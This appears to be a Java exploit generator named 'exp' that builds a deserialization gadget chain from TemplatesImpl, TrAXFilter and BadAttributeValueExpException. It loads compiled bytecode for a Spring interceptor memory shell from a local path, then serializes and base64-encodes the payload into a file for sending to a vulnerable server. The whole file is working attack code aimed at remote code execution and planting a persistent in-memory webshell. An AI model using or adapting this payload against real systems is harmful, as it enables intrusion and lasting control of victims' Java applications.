import com.bits.utils.ClassBuilder;
import com.bits.utils.MyObjectInputStream;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Tools.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Tools.setFieldValue(templates, "_name", "1diot9");
        Tools.setFieldValue(templates, "_class", null);
        String path = "D:/1tmp/classes/CalcAbs.class";
        String memPath = "D:/1tmp/memshell/Sping_Interceptor/BadInterceptor_within.class";
        byte[] bytes = Files.readAllBytes(Paths.get(memPath));
        Tools.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        ClassBuilder classBuilder = new ClassBuilder();
        classBuilder.setClassName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        classBuilder.setArgsType(new Class[]{Templates.class});
        classBuilder.setArgsValue(new Object[]{templates});

        BadAttributeValueExpException bad = new BadAttributeValueExpException("any");
        Tools.setFieldValue(bad, "val", classBuilder);

        byte[] serialize = Tools.serialize(bad);

        String s = Base64.getEncoder().encodeToString(serialize);
        FileOutputStream fos = new FileOutputStream("mem.txt");
        fos.write(s.getBytes());

//        ByteArrayInputStream bais = new ByteArrayInputStream(serialize);
//        MyObjectInputStream myObjectInputStream = new MyObjectInputStream(bais);
//        myObjectInputStream.readObject();

    }

    static class Tools{
        public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Class<?> clazz = obj.getClass();
            Field field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }

        public static byte[] serialize(Object obj) throws Exception{
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        }
    }
}
